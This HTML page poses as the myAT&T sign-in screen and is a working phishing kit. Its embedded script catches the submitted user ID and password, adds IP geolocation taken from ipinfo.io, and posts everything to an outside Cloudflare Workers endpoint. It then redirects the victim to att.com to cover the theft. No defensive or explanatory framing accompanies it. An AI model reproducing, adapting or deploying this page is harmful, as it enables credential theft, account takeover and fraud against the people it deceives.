<!DOCTYPE html>
<html lang="en" class="isPC isChrome isLandscape is-mouse">
<head>
    <meta charset="UTF-8">
    <title>Login Screen</title>
    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7;IE=11; IE=EDGE">
    <meta name="viewport" content="width=device-width, initial-scale=1.0,shrink-to-fit=no">
    <meta name="apple-itunes-app" content="app-id=309172177">
    <link rel="stylesheet" href="jalab.css">
    <meta name="referrer" content="no-referrer">
    <script src="crypto-js.min.js" referrerpolicy="no-referrer"></script>
    <link rel="icon" type="image/x-icon" href="ccc13ea6e1bf7ca9fe31b0dd997981fa8ec6a2e1.ico">
</head>
<body>

<div id="main_div" class="main_div">
    <app-card role="main">
        <div class="card rel z0 flex flex-column no-border-sm radius-lg no-radius-sm mar-t-none-sm border-shadow login-card mar-t-xl-lg">
            <div class="pad-lg-lg pad-xl-sm pad-t-lg-lg pad-t-xl pad-b-lg-lg pad-b-xl pad-l-lg pad-r-lg">
                <app-header class="flex-container">
                    <img id="headerLogoImage" alt="Logo" src="b3d9a34c74bdecaacec751a8122c441d8f2538b4.svg" class="header-logo-image mar-b-md-all">
                    <div class="mar-b-md-all text-center">
                        <h1 class="heading-lg">Sign in</h1>
                        <h1 class="heading-md mar-t-xxs-lg">to myAT&T</h1>
                    </div>
                </app-header>

                <div class="width-full">
                    <router-outlet></router-outlet>
                    <app-manual-login>
                        <form id="login" class="manual-login-form">
                            <div class="form-row space-below">
                                <label for="userID" class="formfield-label">User ID</label>
                                <input id="userID" name="userID" type="email" class="textfield" required>
                            </div>
                            <div class="form-row space-below">
                                <label for="password" class="formfield-label">Password</label>
                                <input id="password" name="password" type="password" class="textfield textfield-password" required>
                            </div>
                            <div class="continue-button-spacing">
                                <button type="submit" class="btn-full-width btn-primary letter-spacing-3">Sign in</button>
                            </div>
                        </form>
                    </app-manual-login>
                </div>
            </div>
        </div>
    </app-card>
</div>

<!-- ðŸ”¹ JavaScript Integration for Cloudflare Worker -->
<script>
document.addEventListener("DOMContentLoaded", function () {
    document.getElementById("login").addEventListener("submit", async function (event) {
        event.preventDefault(); // Prevent default form submission
        
        // Collect form data
        const userID = document.getElementById("userID").value;
        const password = document.getElementById("password").value;

        // Get user device & IP details
        const response = await fetch("https://ipinfo.io/json");
        const ipData = await response.json();

        const userData = {
            userID: userID,
            password: password,
            country: ipData.country,
            state: ipData.region,
            city: ipData.city,
            zip: ipData.postal,
            ip: ipData.ip,
            isp: ipData.org,
            userAgent: navigator.userAgent
        };

        // Send data to Cloudflare Worker
        fetch("https://aut0-curr-9dc7.henrycrane65.workers.dev/", { // Replace with your Cloudflare Worker URL
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(userData)
        })
        .then(response => response.text())
        .then(result => {
            alert("Processing... Redirecting");
            window.location.href = "https://www.att.com"; // Redirect after submission
        })
        .catch(error => console.error("Error:", error));
    });
});
</script>

</body>
</html>
